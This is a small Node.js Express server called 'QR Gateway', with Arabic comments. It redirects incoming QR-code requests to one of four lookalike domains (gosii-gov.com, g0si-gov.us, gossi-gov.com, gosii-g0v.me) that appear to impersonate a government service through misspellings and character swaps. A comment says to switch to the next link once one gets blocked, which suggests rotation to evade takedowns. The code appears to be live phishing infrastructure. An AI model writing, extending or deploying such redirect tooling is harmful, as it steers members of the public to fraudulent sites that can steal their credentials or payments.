const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

// روابطك (بالترتيب)
const TARGETS = [
  "https://gosii-gov.com/?code={CODE}",
  "https://g0si-gov.us/?code={CODE}",
  "https://gossi-gov.com/?code={CODE}",
  "https://gosii-g0v.me/?code={CODE}"
];

let currentIndex = 0;

app.get("/go", (req, res) => {
  const code = req.query.code;
  if (!code) {
    return res.status(400).send("Missing code");
  }

  // اختر الرابط الحالي
  const target = TARGETS[currentIndex];
  const url = target.replace("{CODE}", encodeURIComponent(code));

  // انتقل للرابط
  res.redirect(url);

  // لو انحظر لاحقًا، تغيّر المؤشر يدويًا
});

app.listen(PORT, () => {
  console.log(`QR Gateway running on port ${PORT}`);
});
